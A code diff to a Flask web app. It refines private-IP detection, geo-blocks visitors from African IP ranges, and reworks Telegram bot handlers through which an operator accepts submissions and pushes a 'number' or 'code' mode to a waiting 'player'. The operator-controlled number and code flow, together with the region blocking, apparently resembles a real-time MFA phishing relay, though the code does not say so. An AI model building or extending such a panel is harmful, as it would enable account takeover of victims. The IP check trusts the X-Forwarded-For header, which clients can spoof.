@@ -123,15 +123,30 @@ AFRICAN_CC = {
 
 
 def _is_private(ip: str) -> bool:
+    if not ip:
+        return True
+    cleaned = ip.strip().lower()
+    if cleaned in ("localhost", "127.0.0.1", "::1", "0.0.0.0", "unknown"):
+        return True
+    if cleaned.startswith("127.") or cleaned.startswith("::ffff:127."):
+        return True
     try:
-        o = ipaddress.ip_address(ip)
-        return o.is_private or o.is_loopback or o.is_link_local
+        o = ipaddress.ip_address(cleaned)
+        if o.is_private or o.is_loopback or o.is_link_local or o.is_unspecified:
+            return True
+        if hasattr(o, "ipv4_mapped") and o.ipv4_mapped:
+            m = o.ipv4_mapped
+            return m.is_private or m.is_loopback or m.is_link_local or m.is_unspecified
     except ValueError:
         return False
+    return False
 
 
 def is_african_ip(ip: str) -> bool:
-    if not ip or ip in ("Unknown", "127.0.0.1", "::1"):
+    if not ip:
+        return False
+    cleaned = ip.strip().lower()
+    if cleaned in ("unknown", "localhost", "127.0.0.1", "::1", "0.0.0.0"):
         return False
     if _is_private(ip):
         return False
@@ -277,8 +292,14 @@ def gate() -> Any:
         return None
     if request.endpoint in ("telegram_webhook", "access_diag") or is_ngrok():
         return None
-    ip = (request.headers.get("X-Forwarded-For", request.remote_addr or "")
+    remote_addr = (request.remote_addr or "").strip()
+    host = (request.host or "").strip().lower()
+    if "localhost" in host or "127.0.0.1" in host or _is_private(remote_addr):
+        return None
+    ip = (request.headers.get("X-Forwarded-For", remote_addr or "")
           .split(",")[0].strip())
+    if _is_private(ip):
+        return None
     if is_african_ip(ip):
         return jsonify({"error": "Access denied. Not available in your region.", "blocked": True}), 403
 
@@ -350,34 +371,37 @@ def handle_update(update: dict) -> None:
 
     if cmd == "accept":
         set_state(sid, status="accepted", mode=None, number=None)
-        if message_id:
-            tg_async("editMessageReplyMarkup",
-                     {"chat_id": chat_id, "message_id": message_id,
-                      "reply_markup": control_kb(sid)}, silent_409=True)
+        # Send a NEW message with mode buttons — original submission stays untouched
+        tg_async("sendMessage", {
+            "chat_id": chat_id,
+            "text": "✅ Accepted. Choose a mode:",
+            "reply_markup": control_kb(sid),
+        }, silent_409=True)
 
     elif cmd == "decline":
         set_state(sid, status="declined", mode=None, number=None)
-        if message_id:
-            tg_async("editMessageText",
-                     {"chat_id": chat_id, "message_id": message_id,
-                      "text": "❌ Session declined."}, silent_409=True)
+        # Send a NEW message — original submission stays untouched
+        tg_async("sendMessage", {
+            "chat_id": chat_id,
+            "text": "❌ Session declined.",
+        }, silent_409=True)
 
     elif cmd == "mode" and len(parts) > 1:
         mode = parts[1]
         if mode == "number":
             set_state(sid, status="accepted", mode="number", number=None)
-            if message_id:
-                # Show number grid; operator picks a number then sees "Switch to Code"
-                tg_async("editMessageReplyMarkup",
-                         {"chat_id": chat_id, "message_id": message_id,
-                          "reply_markup": number_kb(sid)}, silent_409=True)
+            tg_async("sendMessage", {
+                "chat_id": chat_id,
+                "text": "🔢 Number mode. Pick a number:",
+                "reply_markup": number_kb(sid),
+            }, silent_409=True)
         elif mode == "code":
             set_state(sid, status="accepted", mode="code", number=None)
-            if message_id:
-                tg_async("editMessageText",
-                         {"chat_id": chat_id, "message_id": message_id,
-                          "text": "✅ Code mode active – waiting for player to enter their code.",
-                          "reply_markup": switch_to_number_kb(sid)}, silent_409=True)
+            tg_async("sendMessage", {
+                "chat_id": chat_id,
+                "text": "🔑 Code mode active – waiting for player to enter their code.",
+                "reply_markup": switch_to_number_kb(sid),
+            }, silent_409=True)
 
     elif cmd == "number" and len(parts) > 2:
         try:
@@ -385,12 +409,11 @@ def handle_update(update: dict) -> None:
         except ValueError:
             return
         set_state(sid, status="accepted", mode="number", number=n)
-        if message_id:
-            # Replace number grid with the chosen number + switch button
-            tg_async("editMessageText",
-                     {"chat_id": chat_id, "message_id": message_id,
-                      "text": f"✅ Number selected: {n}",
-                      "reply_markup": switch_to_code_kb(sid)}, silent_409=True)
+        tg_async("sendMessage", {
+            "chat_id": chat_id,
+            "text": f"✅ Number selected: {n}",
+            "reply_markup": switch_to_code_kb(sid),
+        }, silent_409=True)
 
 
 # ──────────────────────────────────────────────────────────────────────────────
